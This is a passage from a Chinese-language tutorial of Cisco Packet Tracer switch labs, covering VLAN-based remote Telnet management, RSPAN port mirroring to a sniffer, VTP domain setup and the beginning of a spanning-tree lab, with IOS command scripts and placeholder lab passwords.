交换机可以定义任何VLAN对应的IP接口，并把该IP接口作为管理接口。为该IP接口配置的IP地址自然作为该交换机的管理地址。终端实现对该交换机远程配置的前提是，存在该终端与交换机管理接口之间的传输通路。如图7-1所示的网络结构，可以分别为交换机S1，S2和S3定义VLAN4对应的IP接口，并将该IP接口作为这三个交换机的管理接口。由于只有终端C和终端D属于VLAN4，因此，只有终端C和终端D能够实现对这三个交换机的远程配置过程。为三个交换机中VLAN4对应的IP接口分配与终端C和终端D有着相同网络号的IP地址。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置网络拓扑.png" alt="交换机VLAN远程配置网络拓扑"></center><center>图7-1 网络拓扑</center><h3 id="实验目的-5"><a href="#实验目的-5" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>验证交换机管理接口定义过程</li><li>验证实施交换机远程配置的条件</li><li>验证控制允许实施远程配置过程的终端范围的方法</li></ol><h3 id="实验原理-5"><a href="#实验原理-5" class="headerlink" title="实验原理"></a>实验原理</h3><ul><li>需要为每一个交换机定义管理接口，并为管理接口分配IP地址；</li><li>需要保证允许实施远程配置的终端与每一个交换机的管理接口之间的连通性；</li><li>需要启动交换机远程登录功能。通常情况下，远程登录过程中，交换机需要鉴别远程登录用户的身份，因此，需要在交换机中配置鉴别信息，交换机通过配置的鉴别信息对用户的身份和配置权限进行鉴别；</li><li>通过VLAN划分，限制允许建立与每一个交换机的管理接口之间的传输通路的终端范围。</li></ul><h3 id="实验步骤-5"><a href="#实验步骤-5" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图7-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置构建的网络拓扑.png" alt="交换机VLAN远程配置构建的网络拓扑"></center><center>图7-2 构建的网络拓扑</center></li><li><p><strong>完成网络基本配置（IP地址、子网掩码、VLAN配置），如图7-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置终端A基本配置.png" alt="交换机VLAN远程配置终端A基本配置"></center><center>图7-3 终端A基本配置</center><p>其他终端与终端A做类似操作，如图7-4所示。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置S1基本配置.png" alt="交换机VLAN远程配置S1基本配置"></center><center>图7-4 S1基本配置</center><p>   其他交换机按要求进行类似配置</p><ol start="3"><li><p><strong>S1远程管理配置，如图7-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置S1远程管理配置.png" alt="交换机VLAN远程配置S1远程管理配置"></center><center>图7-5 S1远程管理配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    username <span class="token number">aaa1</span> password <span class="token number">bbb1</span>   line vty <span class="token number">0</span> <span class="token number">4</span>   login <span class="token keyword">local</span>    <span class="token keyword">exit</span>   <span class="token keyword">enable</span> password <span class="token number">ccc1</span>   <span class="token keyword">int</span> vlan <span class="token number">4</span>   ip <span class="token keyword">add</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.17</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>   <span class="token keyword">exit</span></code></pre><ol start="4"><li><p><strong>S2远程管理配置，如图7-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置S2远程管理配置.png" alt="交换机VLAN远程配置S2远程管理配置"></center><center>图7-6 S2远程管理配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    username <span class="token number">aaa2</span> password <span class="token number">bbb2</span>   line vty <span class="token number">0</span> <span class="token number">4</span>   login <span class="token keyword">local</span>    <span class="token keyword">exit</span>   <span class="token keyword">enable</span> password <span class="token number">ccc2</span>   <span class="token keyword">int</span> vlan <span class="token number">4</span>   ip <span class="token keyword">add</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.27</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>   <span class="token keyword">exit</span></code></pre><ol start="5"><li><p><strong>S3远程管理配置，如图7-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置S3远程管理配置.png" alt="交换机VLAN远程配置S3远程管理配置"></center><center>图7-7 S3远程管理配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    username <span class="token number">aaa3</span> password <span class="token number">bbb3</span>   line vty <span class="token number">0</span> <span class="token number">4</span>   login <span class="token keyword">local</span>    <span class="token keyword">exit</span>   <span class="token keyword">enable</span> password <span class="token number">ccc3</span>   <span class="token keyword">int</span> vlan <span class="token number">4</span>   ip <span class="token keyword">add</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.37</span> <span class="token number">255.255</span><span class="token punctuation">.</span><span class="token number">255.0</span>   <span class="token keyword">exit</span></code></pre><ol start="6"><li><p><strong>终端C-Telnet-交换机S3，如图7-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换机VLAN远程配置终端C-Telnet-S3.png" alt="交换机VLAN远程配置终端C-Telnet-S3"></center><center>图7-8 终端C-Telnet-S3</center></li></ol><h2 id="RSPAN配置实验"><a href="#RSPAN配置实验" class="headerlink" title="RSPAN配置实验"></a>RSPAN配置实验</h2><h3 id="实验内容-6"><a href="#实验内容-6" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        该实验在<strong>跨交换机VLAN配置实验</strong>的基础上进行，在交换机S3上连接一个嗅探器，要求该嗅探器可嗅探到终端A发送的ICMP报文，即嗅探器可以复制下所有由终端A发送的ICMP报文，网络拓扑如图8-1所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置网络拓扑.png" alt="RSPAN配置网络拓扑"></center><center>图8-1 网络拓扑</center><h3 id="实验目的-6"><a href="#实验目的-6" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>验证端口映射原理</li><li>验证Cisco实现远程端口映射的过程</li><li>验证RSPAN VLAN配置过程</li><li>验证RSPAN VLAN的作用和工作过程</li><li>验证嗅探器实现远程嗅探的过程</li></ol><h3 id="实验原理-6"><a href="#实验原理-6" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        交换机S1连接终端A的端口为源端口，交换机S3连接嗅探器的端口为目的端口，创建一个用于建立交换机S1至交换机S3传输通道的RSPAN VLAN。交换机S1接收到终端A发送的MAC帧后，将MAC帧映射到一个反射端口，由反射端口将该MAC帧发送带RSPAN VLAN，该MAC帧通过RSPAN VLAN到达交换机S3，由交换机S3将该MAC帧映射到目的端口。因此，实现远程端口映射后，端口A发送的MAC帧存在两种独立的传输路径：</p><ul><li>正常的传输路径，该传输路径由该MAC帧的目的MAC地址和该传输路径经过的交换机的转发表确定</li><li>通过RSPAN VLAN实现的源端口至目的端口的传输路径</li></ul><h3 id="实验步骤-6"><a href="#实验步骤-6" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按要求构建网络拓扑，如图8-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置构建网络拓扑.png" alt="RSPAN配置构建网络拓扑"></center><center>图8-2 构建网络拓扑</center></li><li><p><strong>对网络设备进行基本配置（IP配置，子网掩码，基本VLAN）</strong></p><p>对终端A的基本配置（其他终端也进行类似配置），如图8-3所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置终端A基本配置.png" alt="RSPAN配置终端A基本配置"></center><center>图8-3 终端A基本配置</center><p>对交换机S1的基本配置（其他交换机也需要安装网络连接要求进行配置），如图8-4所示。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置S1基本配置.png" alt="RSPAN配置S1基本配置"></center><center>图8-4 S1基本配置</center><ol start="3"><li><p><strong>S1的RSPAN VLAN配置，如图8-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置S1RSPAN配置.png" alt="RSPAN配置S1RSPAN配置"></center><center>图8-5 S1RSPAN配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   <span class="token number">ccc1</span>   conf t    vlan <span class="token number">5</span>   remote<span class="token operator">-</span>span   name rspan   <span class="token keyword">exit</span>   <span class="token keyword">no</span> monitor <span class="token keyword">session</span> <span class="token keyword">all</span>    monitor <span class="token keyword">session</span> <span class="token number">1</span> source interface <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span> rx   monitor <span class="token keyword">session</span> <span class="token number">1</span> destination remote vlan <span class="token number">5</span> reflector<span class="token operator">-</span>port <span class="token number">f0</span><span class="token operator">/</span><span class="token number">17</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">17</span>   <span class="token keyword">shutdown</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">4</span>   switchport mode trunk    switchport trunk allowed vlan <span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span>   <span class="token keyword">end</span></code></pre><ol start="4"><li><p><strong>S2的RSPAN VLAN配置，如图8-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置S2RSPAN配置.png" alt="RSPAN配置S2RSPAN配置"></center><center>图8-6 S2RSPAN配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   <span class="token number">ccc2</span>   conf t    vlan <span class="token number">5</span>   remote<span class="token operator">-</span>span   name rspan   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode trunk   switchport trunk allowed vlan <span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode trunk    switchport trunk allowed vlan <span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span>   <span class="token keyword">end</span></code></pre><ol start="5"><li><p><strong>S3的RSPAN VLAN配置，如图8-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置S3RSPAN配置.png" alt="RSPAN配置S3RSPAN配置"></center><center>图8-7 S3RSPAN配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   <span class="token number">ccc3</span>   conf t    vlan <span class="token number">5</span>   remote<span class="token operator">-</span>span   name rspan   <span class="token keyword">exit</span>   <span class="token keyword">no</span> monitor <span class="token keyword">session</span> <span class="token keyword">all</span>   monitor <span class="token keyword">session</span> <span class="token number">1</span> source remote vlan <span class="token number">5</span>   monitor <span class="token keyword">session</span> <span class="token number">1</span> destination <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">5</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">5</span>   switchport mode access   switchport access vlan <span class="token number">5</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">4</span>   switchport mode trunk   switchport trunk allowed vlan <span class="token number">1</span><span class="token operator">-</span><span class="token number">10</span>   <span class="token keyword">end</span></code></pre><ol start="6"><li><p>进入模拟模式，启动终端A至终端B的ICMP报文传输过程，发现终端A发送的ICMP报文同时沿着两条传输路径传输：一是终端A至终端B传输路径；二是交换机S1连接终端A端口至交换机S3连接嗅探器（Sniffer）端口传输路径，如图8-8所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/RSPAN配置终端A至终端B.png" alt="RSPAN配置终端A至终端B"></center><center>图8-8 终端A至终端B</center></li></ol><h3 id="关键命令说明-1"><a href="#关键命令说明-1" class="headerlink" title="关键命令说明"></a>关键命令说明</h3><ol><li><p><strong>创建RSPAN VLAN</strong></p><p>RSPAN VLAN是一种特殊的VLAN，用于构建源端口所在交换机至目的端口所在交换机之间的交换路径，操作命令如图8-9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/创建RSPAN VLAN.png" alt="创建RSPAN VLAN"></center><center>图8-9 创建RSPAN VLAN</center></li><li><p><strong>源端口所在交换机配置过程</strong></p><p>源端口所在交换机需要完成以下配置：一是指定源端口；二是通过源端口接收到的MAC帧映射到一个反射端口，并由发射端口将该MAC帧发送到RSPAN VLAN，操作命令如图8-10所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/源端口所在交换机配置.png" alt="源端口所在交换机配置"></center><center>图8-10 源端口所在交换机配置</center><p>注：</p></li></ol><ul><li>no monitor session all ：清除所有已经配置的映射<ul><li>monitor session 1 source interface f0/1 rx：指定f0/1为源端口；指定需要嗅探的MAC帧，且只嗅探源端口得到的MAC帧</li><li>monitor session 1 destination remote vlan 5 reflector-port f0/17：指定vlan 5为RSPAN VLAN；指定f0/17端口为反射端口</li><li>相同的会话号1（session 1）将源端口和RSPAN VLAN绑定在一起，将通过f0/1接收到的MAC帧映射到发射端口f0/17，并通过发射端口f0/17将该MAC帧发送到VLAN 5。</li></ul></li></ul><ol start="3"><li><p><strong>目的端口所在交换机配置过程</strong></p><p>操作命令如图8-11所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/目的端口所在交换机配置过程.png" alt="目的端口所在交换机配置过程"></center><center>图8-11 目的端口所在交换机配置过程</center></li></ol><h2 id="VTP配置实验"><a href="#VTP配置实验" class="headerlink" title="VTP配置实验"></a>VTP配置实验</h2><h3 id="实验内容-7"><a href="#实验内容-7" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        网络结构如图9-1所示，六个交换机构成的交换式以太网被分成两个VLAN主干协议（VLAN Trunking Protocol，VTP）域；</p><ul><li><p>其中域名为abc的VTP域包含交换机S1、S2和S3，域名为bcd的VTP域包含交换机S4、S5和S6；</p></li><li><p>域名为abc的VTP域中，将交换机S2的VTP模式设置成服务器模式，将其他两个交换机的VTP模式设置成客户端模式。</p></li><li><p>域名为bcd的VTP域中，将交换机S5的VTP模式设置成服务器模式，将其他两个交换机的VTP模式设置成客户端模式。</p></li></ul><p>每一个VT篇域，只需要在VTP模式为服务器的交换机中配置VLAN其他交换机自动创建与该交换机一致的VLAN。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTP网络拓扑.png" alt="VTP网络拓扑"></center><center>图9-1 网络拓扑</center><h3 id="实验目的-7"><a href="#实验目的-7" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>验证交换式以太网VLAN VTP域划分过程</li><li>验证交换机VTP配置过程</li><li>验证交换机通过VTP自动创建VLAN的过程</li><li>验证VTP域之间的连通性</li></ol><h3 id="实验原理-7"><a href="#实验原理-7" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        VTP自动创建VLAN的前提是，所有互连交换机的端口都是被所有VLAN共享的共享端口，因此，所有交换机中用于连接交换机的端口必须被配置成所属有VLAN共享的共享端口。</p><p>​        必须通过手工配置将作为接入端口的交换机端口分配给各个VLAN，因此，必须根据下表中所示的终端和VLAN之间的关系，以手工配置的方式将所有交换机中连接终端的端口分配给对应的VLAN，如表9-1所示。</p><center>表9-1 VALN对应的端口</center><table><thead><tr><th align="center">VLAN</th><th align="center">终端</th></tr></thead><tbody><tr><td align="center">VLAN 2</td><td align="center">终端A，终端C，终端E，终端G</td></tr><tr><td align="center">VLAN 3</td><td align="center">终端B，终端D，终端F，终端H</td></tr></tbody></table><p>​        VTP域的划分只和交换机自动创建VLAN过程有关，即一旦在某个VTP模式为服务器的交换机上创建编号为X、名为Y的VLAN，所有处于同一个VTP域中VTP模式为服务器或客户端的交换机自动创建编号为X、名为Y的VLAN。通过域名区分不同的VTP域，但VTP模式为服务器的交换机上配置的域名能够自动扩散到同一域中的其他交换机，因此，必须在处于不同域的两个域边界交换机上配置各自的域名。VTP域的划分与属于同一个VLAN的两个终端之间的通信过程无关，两个属于不同的VTP域但属于编号相同的VLAN的终端之间可以相互通信。</p><h3 id="实验步骤-7"><a href="#实验步骤-7" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验要求构建网络拓扑，如图9-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTP构建网络拓扑.png" alt="VTP构建网络拓扑"></center><center>图9-2 构建网络拓扑</center></li><li><p><strong>终端基本配置（IP地址、子网掩码），如图9-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTP终端A的基本配置.png" alt="VTP终端A的基本配置"></center><center>图9-3 终端A的基本配置</center><p>其他终端也做类似操作</p></li><li><p><strong>S1配置命令，如图9-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTPS1配置.png" alt="VTPS1配置"></center><center>图9-4 S1配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S1   vtp version <span class="token number">2</span>   vtp domain <span class="token number">abc</span>   vtp mode client   vtp password <span class="token number">123456</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode trunk   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">end</span></code></pre><ol start="4"><li><p><strong>S2配置命令，如图9-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTPS2配置.png" alt="VTPS2配置"></center><center>如图9-5所示</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en    conf t    hostname S2   vtp version <span class="token number">2</span>   vtp mode server   vtp domain <span class="token number">abc</span>   vtp password <span class="token number">123456</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span>   switchport mode trunk   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode trunk   switchport nonegotiate   <span class="token keyword">exit</span>   vlan <span class="token number">2</span>   name vtpabc2   <span class="token keyword">exit</span>   vlan <span class="token number">3</span>   name vtpabc3   <span class="token keyword">exit</span></code></pre><ol start="5"><li><p><strong>S3配置命令，如图9-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTPS3配置.png" alt="VTPS3配置"></center><center>图9-6 S3配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S3   vtp version <span class="token number">2</span>   vtp domain <span class="token number">abc</span>   vtp mode client   vtp password <span class="token number">123456</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode trunk   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">end</span></code></pre><ol start="6"><li><p><strong>S4配置命令，如图9-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTPS4配置.png" alt="VTPS4配置"></center><center>图9-7 S4配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S4   vtp version <span class="token number">2</span>   vtp domain <span class="token number">bcd</span>   vtp mode client   vtp password <span class="token number">123456</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode trunk   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">end</span></code></pre><ol start="7"><li><p><strong>S5配置命令，如图9-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTPS5配置.png" alt="VTPS5配置"></center><center>图9-8 S5配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S5   vtp version <span class="token number">2</span>   vtp mode server   vtp domain <span class="token number">bcd</span>   <span class="token keyword">int</span> range <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span>   switchport mode trunk   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode trunk   switchport nonegotiate   <span class="token keyword">exit</span>   vlan <span class="token number">2</span>   name vtpbcd2   <span class="token keyword">exit</span>   vlan <span class="token number">3</span>   name vtpbcd3   <span class="token keyword">exit</span></code></pre><ol start="8"><li><p><strong>S6配置命令，如图9-9所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTPS6配置.png" alt="VTPS6配置"></center><center>图9-9 S6配置</center><p><strong>命令脚本</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S6   vtp version <span class="token number">2</span>   vtp domain <span class="token number">bcd</span>   vtp mode client   vtp password <span class="token number">123456</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">3</span>   switchport mode trunk   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">1</span>   switchport mode access   switchport access vlan <span class="token number">2</span>   <span class="token keyword">exit</span>   <span class="token keyword">int</span> <span class="token number">f0</span><span class="token operator">/</span><span class="token number">2</span>   switchport mode access   switchport access vlan <span class="token number">3</span>   <span class="token keyword">end</span></code></pre><ol start="9"><li><p><strong>终端A与终端G的连通性测试，如图9-10所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/VTP终端A与终端G的连通性测试.png" alt="VTP终端A与终端G的连通性测试"></center><center>图9-10 终端A与终端G的连通性测试</center></li></ol><h3 id="关键命令说明-2"><a href="#关键命令说明-2" class="headerlink" title="关键命令说明"></a>关键命令说明</h3><ol><li><p><strong>配置域名，如图9-11所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置域名.png" alt="配置域名"></center><center>图9-11 配置域名</center></li></ol><ul><li>vtp domain abc：为交换机配置域名abc</li></ul><ol start="2"><li><p><strong>配置交换机VTP模式，如图9-12所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置交换机VTP模式.png" alt="配置交换机VTP模式"></center><center>图9-12 配置交换机VTP模式</center></li></ol><ul><li>vtp mode server：为服务器或客户端交换机自动创建相同的VLAN；将域名扩散到没有配置域名的交换机中<ul><li>vtp mode cilent：只能同步VTP模式为服务器的交换机上的VLAN</li><li>vtp mode transparent：只能转发VTP报文；VTP模式的服务器对齐没有影响；它对其他交换机没有任何影响</li></ul></li></ul><ol start="3"><li><p><strong>配置VTP版本号，如图9-13所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置VTP版本号.png" alt="配置VTP版本号"></center><center>图9-13 配置VTP版本号</center></li><li><p><strong>配置域管理密码，如图9-14所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置域管理密码.png" alt="配置域管理密码"></center><center>图9-14 配置域管理密码</center></li></ol><ul><li>VTP密码用于验证发送VTP通告的交换机的身份</li></ul><ol start="5"><li><p><strong>禁止发送DTP协商报文，如图9-15所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/禁止发送DTP协商报文.png" alt="禁止发送DTP协商报文"></center><center>图9-15 禁止发送DTP协商报文</center><p>注：</p><p>两个共享端口之间通过动态中继协议（Dynamic Trunking Protocol,DTP）协商端口属性。如果两个共享端口分别属于不同的VTP域，那么会使协商过程出错，因此，需要在域边界交换机中用于连接其他域边界交换机的共享端口上禁止DTP协商过程。</p></li></ol><h1 id="第4章-生成树实验"><a href="#第4章-生成树实验" class="headerlink" title="第4章 生成树实验"></a>第4章 生成树实验</h1><p>​        生成树协议用于在一个存在冗余路径的以太网中为终端之间构建没有环路的交换路径，由于可以基于VLAN构建生成树，因此，可以通过网络设计和生成树协议同时实现容错和负载均衡功能。</p><h2 id="容错实验"><a href="#容错实验" class="headerlink" title="容错实验"></a>容错实验</h2><h3 id="实验内容-8"><a href="#实验内容-8" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        构建如图10-1（a）所示的有着冗余路径的以太网结构，通过生成树协议生成如图10-1（b）所示的以交换机S4为根的生成树。为了验证生成树协议的容错性，删除交换机S4与交换机S5之间、交换机S5与交换机S7之间的物理链路，如图10-1（c）所示。生成树协议通过重新构建生成树保证网络的连通性，如图10-1（d）所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(a) 原始网络结构.png" alt="图4.1(a) 原始网络结构"></center><center>图10-1(a) 原始网络结构</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(b) 生成树协议阻塞的端口.png" alt="图4.1(b) 生成树协议阻塞的端口"></center><center>图10-1(b) 生成树协议阻塞的端口</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(c) 删除物理链路1.png" alt="图4.1(c) 删除物理链路1"></center><center>图10-1(c) 删除物理链路</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(d)生成树协议重新调整阻塞端口.png" alt="图4.1(d)生成树协议重新调整阻塞端口"></center><center>图10-1(d) 生成树协议重新调整阻塞端口</center><h3 id="实验目的-8"><a href="#实验目的-8" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>掌握交换机生成树协议配置过程</li><li>验证生成树协议建立生成树过程</li><li>验证BPDU报文内容和格式</li><li>验证生成树协议实现容错的机制</li></ol><h3 id="实验原理-8"><a href="#实验原理-8" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        为了生成如图10-1（b）所示的以交换机S4为根网桥的生成树，需要将交换机S4的优先级设置为最高，同时保证其他交换机优先级满足：S2&gt;S3&gt;S5&gt;S6。因此，S2、S3、S4、S5、S6的优先级配置分别为：8192，12288，4096，16384，20480，其余交换机采用默认值。在图10-1（b）所示的生成树中，橘色指示灯所在的端口是被生成树协议阻塞的端口，通过阻塞这些端口，该生成树既保持了交换机之间的连通性，又消除了交换机之间的环路。一旦如图10-1（c）所示，删除交换机S4和S5之间、交换机S5和S7的物理链路，将导致交换机S5和S7与其他交换机之间的连通性遭到破坏。生成树协议能过自动检测到网络拓扑结构发生的变化，通过调整阻塞端口，重新构建的生成树既保证了交换机之间的连通性，又保证交换机之间不存在环路。</p><h3 id="实验步骤-8"><a href="#实验步骤-8" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按照实验构建网络拓扑，根据默认设置构建的生成树如图10-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/图4.1(a) 原始网络结构.png" alt="构建网络拓扑"></center><center>图10-2 构建网络结构</center></li><li><p><strong>S1配置命令，如图10-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/容错S1配置.png" alt="容错S1配置"></center><center>图10-3 S1配置</center><p><strong>命令配置</strong>：</p></li></ol><pre class=" language-sql"><code class="language-sql">   en   conf t    hostname S1   spanning<span class="token operator">-</span>tree mode pvst   <span class="token keyword">end</span></code></pre><ol 